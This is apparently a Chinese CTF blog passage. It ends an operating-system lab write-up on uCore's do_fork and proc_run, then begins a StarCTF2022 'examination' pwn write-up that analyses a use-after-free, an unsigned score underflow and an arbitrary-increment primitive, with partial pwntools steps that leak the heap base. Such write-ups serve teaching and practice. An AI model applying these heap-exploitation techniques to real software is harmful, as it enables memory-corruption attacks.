<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> E_NO_FREE_PROC      5   <span class="comment">// 尝试创建一个新的process beyond</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSTACKPAGE          2     </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;-------- start --------&gt; */</span></span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>) &#123; <span class="comment">/* 分配一个物理页,作为proc_struct */</span></span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    proc-&gt;parent = current; <span class="comment">/* 设置父进程为当前进程 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123; <span class="comment">/* 分配内核栈 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123; <span class="comment">/* 将所有虚拟页数据复制过去 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf); <span class="comment">/* 复制线程的状态,包括寄存器上下文等等 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid(); <span class="comment">/* 为进程分配唯一的PID */</span></span><br><span class="line">        hash_proc(proc); <span class="comment">/* 将proc添加到进程哈希链表中 */</span></span><br><span class="line">        list_add(&amp;proc_list, &amp;(proc-&gt;list_link)); <span class="comment">/* 将proc添加到进程链表中 */</span></span><br><span class="line">        nr_process ++; <span class="comment">/* 将全局线程的数目加1 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">    wakeup_proc(proc); <span class="comment">/* 设置新的子进程可执行 */</span></span><br><span class="line">    ret = proc-&gt;pid; <span class="comment">/* 设置返回值为pid */</span></span><br><span class="line">    <span class="comment">/* &lt;-------- end --------&gt; */</span> </span><br><span class="line">    </span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习3-理解proc-run函数和它调用的函数如何完成进程切换的"><a href="#练习3-理解proc-run函数和它调用的函数如何完成进程切换的" class="headerlink" title="练习3-理解proc_run函数和它调用的函数如何完成进程切换的"></a>练习3-理解proc_run函数和它调用的函数如何完成进程切换的</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">proc_run</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123; <span class="comment">/* 再次检查(调度进程,不能等于当前进程) */</span></span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> =</span> current, *next = proc;</span><br><span class="line">        local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            current = proc; <span class="comment">/* 设置当前执行的进程 */</span></span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE); <span class="comment">/* 设置ring0的内核栈地址 */</span></span><br><span class="line">            lcr3(next-&gt;cr3); <span class="comment">/* 加载页目录表 */</span></span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context)); <span class="comment">/* 切换上下文(汇编) */</span></span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实这个在前面已经提过了</p>
<p>PS：“local_intr_save”和“local_intr_restore”用于实现“原子操作”，使得某些关键的代码不会被打断，从而避免引起一些未预料到的错误，避免条件竞争 </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/19/StarCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/19/StarCTF2022/" class="post-title-link" itemprop="url">StarCTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-19 00:36:29" itemprop="dateCreated datePublished" datetime="2022-04-19T00:36:29+08:00">2022-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-21 11:09:36" itemprop="dateModified" datetime="2022-07-21T11:09:36+08:00">2022-07-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="examination"><a href="#examination" class="headerlink" title="examination"></a>examination</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./examination </span><br><span class="line"> _____                              _                   _     _                 </span><br><span class="line">|  ___|                            (_)                 | |   (_)                 </span><br><span class="line">| |__   __  __   __ _   _ __ ___    _   _ __     __ _  | |_   _    ___    _ __   </span><br><span class="line">|  __|  \ \/ /  / _` | | <span class="string">&#x27;_ ` _ \  | | | &#x27;</span>_ \   / _` | | __| | |  / _ \  | <span class="string">&#x27;_ \  </span></span><br><span class="line"><span class="string">| |___   &gt;  &lt;  | (_| | | | | | | | | | | | | | | (_| | | |_  | | | (_) | | | | | </span></span><br><span class="line"><span class="string">\____/  /_/\_\  \__,_| |_| |_| |_| |_| |_| |_|  \__,_|  \__| |_|  \___/  |_| |_| </span></span><br><span class="line"><span class="string">role: &lt;0.teacher/1.student&gt;: 11</span></span><br><span class="line"><span class="string">no student yet</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">examination: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">316f</span>f7d18256c35fdf207a21d1e492fa8b73e294, stripped</span><br><span class="line"> </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/examination&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  <span class="string">&#x27;/lib/x86_64-linux-gnu/&#x27;</span></span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>)</span> stable release versi</span></span><br></pre></td></tr></table></figure>
<ul>
<li>calloc 同 malloc 类似只是会将申请到的堆块内容清 0 </li>
<li>calloc 不会从 tcachebin 里取空闲的 chunk ，而是从 fastbin 里取，取完后，和 malloc 一样，如果 fastbin 里还有剩余的 chunk ，则全部放到对应的 tcache bin 里取，采用头插法</li>
</ul>
<p>chunk 结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">student_list =&gt; student =&gt; chunk</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">free_t</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;only 3 chances to call parents!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( call_chances )</span><br><span class="line">  &#123;</span><br><span class="line">    --call_chances;</span><br><span class="line">    <span class="keyword">if</span> ( student_num )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which student id to choose?&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">5uLL</span>);</span><br><span class="line">      id = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( id &gt;= <span class="number">0</span> &amp;&amp; id &lt;= <span class="number">9</span> &amp;&amp; student_list[id] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad luck for student %d! Say goodbye to him/her!&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)id);</span><br><span class="line">        <span class="keyword">if</span> ( (*student_list[id])-&gt;chunk.comment )</span><br><span class="line">          <span class="built_in">free</span>((<span class="keyword">void</span> *)(*student_list[id])-&gt;chunk.comment);</span><br><span class="line">        <span class="built_in">free</span>(*student_list[id]);</span><br><span class="line">        <span class="built_in">free</span>(student_list[id]);</span><br><span class="line">        student_list[id] = <span class="number">0LL</span>;                 <span class="comment">// UAF</span></span><br><span class="line">        --student_num;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please watch carefully :)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;add some students first!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no you can&#x27;t&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>“释放模块”只置空了“student_list[id]”</li>
<li>student，chunk，comment 造成 UAF</li>
</ul>
<p><strong>入侵思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">check_s</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *addr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)student_list[a1] + <span class="number">7</span>) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;already gained the reward!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*student_list[a1])-&gt;chunk.random_score &gt; <span class="number">0x59</span>u )<span class="comment">// random_score至少90</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good Job! Here is your reward! %p\n&quot;</span>, student_list[a1]);<span class="comment">// 可以泄露地址</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>);</span><br><span class="line">      read_s(<span class="number">0</span>, nptr, <span class="number">16</span>);</span><br><span class="line">      addr = (_BYTE *)atol(nptr);</span><br><span class="line">      ++*addr;                                  <span class="comment">// 输入一个地址,使其++</span></span><br><span class="line">      *((_DWORD *)student_list[a1] + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*student_list[a1])-&gt;chunk.comment )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;here is the review:&quot;</span>);</span><br><span class="line">      write(<span class="number">1</span>, (<span class="keyword">const</span> <span class="keyword">void</span> *)(*student_list[a1])-&gt;chunk.comment, SLODWORD((*student_list[a1])-&gt;chunk.size_comment));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no reviewing yet!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>check_s 这个函数大有文章，即可以泄露地址，又有一次“任意++”的机会</p>
<p>想要使用“reward”，必须满足以下条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*student_list[a1])-&gt;chunk.random_score &gt; <span class="number">0x59</span>u )<span class="comment">// random_score至少90</span></span><br></pre></td></tr></table></figure>
<p>这个“random_score”是在以下函数中定义的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">give_t</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> random_score; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;marking testing papers.....&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; student_num; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(random, buf, <span class="number">8uLL</span>) != <span class="number">8</span> )         <span class="comment">// 获取一个8字节的随机数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;read_error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[<span class="number">0</span>] &amp;= ~<span class="number">0x80</span>u;</span><br><span class="line">    random_score = buf[<span class="number">0</span>] % (<span class="number">10</span> * (*student_list[i])-&gt;chunk.question_num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;score for the %dth student is %d\n&quot;</span>, i, random_score);</span><br><span class="line">    <span class="keyword">if</span> ( *((_DWORD *)student_list[i] + <span class="number">6</span>) == <span class="number">1</span> )<span class="comment">// student中标记pray_key</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;the student is lazy! b@d!&quot;</span>);</span><br><span class="line">      random_score -= <span class="number">10</span>;</span><br><span class="line">    &#125;                                           <span class="comment">// student_list =&gt; student =&gt; chunk</span></span><br><span class="line">    (*student_list[i])-&gt;chunk.random_score = random_score;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数 give_t 会根据一个随机数“buf”和“question_num”对“random_score”进行赋值，而“question_num”在以下函数中实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add_t</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> question_num[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  Student **student; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  Chunk *chunk; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  question_num[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  question_num[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)student_num &lt;= <span class="number">6</span> )         <span class="comment">// 最多添加7个student</span></span><br><span class="line">  &#123;</span><br><span class="line">    student = (Student **)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">    chunk = (Chunk *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x18</span>uLL);     <span class="comment">// student_list =&gt; student =&gt; chunk</span></span><br><span class="line">    *student = (Student *)chunk;</span><br><span class="line">    student_list[student_num++] = student;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter the number of questions: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, question_num);</span><br><span class="line">    <span class="keyword">if</span> ( question_num[<span class="number">0</span>] &lt;= <span class="number">9</span> &amp;&amp; question_num[<span class="number">0</span>] &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      (*student)-&gt;chunk.question_num = question_num[<span class="number">0</span>];</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong input!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No more students!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在函数 add_t 中：“question_num”最高被赋值为“9”，最终执行结果就是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random_score = random % (<span class="number">10</span> * <span class="number">9</span>);</span><br></pre></td></tr></table></figure>
<p>也就是说：“question_num”最大为“89”，根本不可能为“90”</p>
<p>所以我们的第一步就是修改“question_num”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random_score; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( LODWORD(student_list[i]-&gt;is_pray) == <span class="number">1</span> )<span class="comment">// student中标记pray_key</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;the student is lazy! b@d!&quot;</span>);</span><br><span class="line">    random_score -= <span class="number">10</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这里的“random_score”是“unsigned int”类型的，所以可以进行负数溢出，这样就可以进行泄露了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;-------- 样例 --------&gt; */</span></span><br><span class="line">role(<span class="number">0</span>)</span><br><span class="line">add_st(<span class="number">1</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">pray()</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give()</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Good Job! Here is your reward! &#x27;</span>)</span><br><span class="line">leak_addr = eval(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>])</span><br><span class="line">heap_base = leak_addr<span class="number">-16</span><span class="number">-0x290</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+hex(heap_base))</span><br></pre></td></tr></table></figure>
<p>另外还有一次“任意++”的机会可以使用，但我们这里只泄露出了 heap_base ，所以只能修改堆上的数据，可以用它来构造“off-by-one”</p>
<ul>
<li>因为这些 chunk 都分布在 tcache 上，所以不考虑 unlink 攻击</li>
